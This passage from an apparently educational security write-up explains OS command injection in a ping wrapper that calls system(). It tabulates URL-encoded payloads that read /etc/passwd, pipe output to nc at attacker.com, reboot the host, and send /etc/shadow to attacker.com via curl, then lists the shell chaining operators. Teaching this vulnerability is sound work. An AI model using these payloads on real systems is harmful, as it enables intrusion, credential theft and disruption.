## How an Attacker Exploits It

Because `system()` passes the entire constructed string to `/bin/sh`, any shell metacharacters in the user input are interpreted. The attacker simply inserts them after a valid target.

### Example Payloads and Resulting Shell Commands

| User Input (URL‑encoded) | Decoded Input | Resulting Shell Command |
|---------------------------|---------------|--------------------------|
| `host=127.0.0.1;%20cat%20/etc/passwd` | `127.0.0.1; cat /etc/passwd` | `ping -c 4 127.0.0.1; cat /etc/passwd` |
| `host=127.0.0.1%20%26%26%20whoami` | `127.0.0.1 && whoami` | `ping -c 4 127.0.0.1 && whoami` |
| `host=127.0.0.1%20%7C%20nc%20attacker.com%204444` | `127.0.0.1 \| nc attacker.com 4444` | `ping -c 4 127.0.0.1 \| nc attacker.com 4444` |
| `host=127.0.0.1%20%7C%7C%20reboot` | `127.0.0.1 \|\| reboot` | `ping -c 4 127.0.0.1 \|\| reboot` |
| `host=127.0.0.1;%20curl%20http://attacker.com/?f=$(cat%20/etc/shadow)` | `127.0.0.1; curl http://attacker.com/?f=$(cat /etc/shadow)` | `ping -c 4 127.0.0.1; curl http://attacker.com/?f=$(cat /etc/shadow)` |

**What each chaining operator does:**

- **`;`** – Runs the next command unconditionally after the first finishes.  
- **`&&`** – Runs the next command **only if** the first succeeds (exit code 0).  
- **`||`** – Runs the next command **only if** the first fails (exit code ≠ 0).  
- **`|`** – Pipes the standard output of the first command as input to the second.  
- **`&`** – Runs the first command in the background and immediately continues to the next.  
- **`$(…)` or backticks** – Performs command substitution before the outer command runs.

